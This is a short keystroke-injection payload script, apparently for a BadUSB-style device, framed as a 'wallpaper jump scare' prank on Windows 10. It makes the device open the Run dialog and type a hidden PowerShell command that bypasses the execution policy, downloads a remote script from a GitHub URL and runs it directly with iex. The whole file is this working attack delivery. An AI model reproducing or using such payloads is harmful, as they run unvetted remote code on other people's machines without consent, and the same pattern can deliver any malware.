// Title: beigeworm's Wallpaper Jump Scare.
// Author: @beigeworm
// Description: This script changes downlaods a scary image and sets it as a wallpaper.
// Target: Windows 10

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/Wallpaper-Jumpscare/main.ps1 | iex");
delay(500);
press("ENTER");